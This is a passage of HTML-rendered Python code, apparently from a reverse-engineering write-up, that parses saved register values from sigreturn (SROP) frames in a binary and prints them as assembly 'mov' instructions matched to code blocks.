style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er10 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x38\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x40\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er11 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x40\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x48\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er12 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x48\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x50\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er13 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x50\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x58\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er14 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x58\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x60\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er15 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x60\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x68\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erdi \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x68\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x70\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ersi \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x70\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x78\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erbp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x78\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x80\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erbx \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x80\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x88\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erdx \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x88\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x90\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erax \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x90\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x98\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ercx \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x98\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xa0\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ersp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xa0\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xa8\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erip \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xa8\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xb0\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Create tuple(indice_code_block, indice_srop_frame)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frame_code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (((frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erip \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e CODE_START_ADDR) \u003cspan style=\"color:#f92672\"\u003e//\u003c/span\u003e CODE_BLOCK_SIZE), i)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    couple_frame_code\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eappend(frame_code)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecode_block \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e []\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e el \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e couple_frame_code:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    offset \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e el[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e CODE_BLOCK_SIZE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    code_block \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e code_section[offset : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x50\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov r8, \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er8\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov r9, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er9\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov r10, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er10\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov r11, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er11\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov r12, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er12\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov r13, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er13\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov r14, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er14\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov r15, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er15\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov rdi, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erdi\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov rsi, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ersi\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov rbp, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erbp\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov rbx, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erbx\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov rdx, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erdx\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov rax, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erax\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov rcx, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ercx\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    load_frame \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e load_frame \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov rsp, 0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[el[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ersp\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(load_frame)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    find_mov \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan 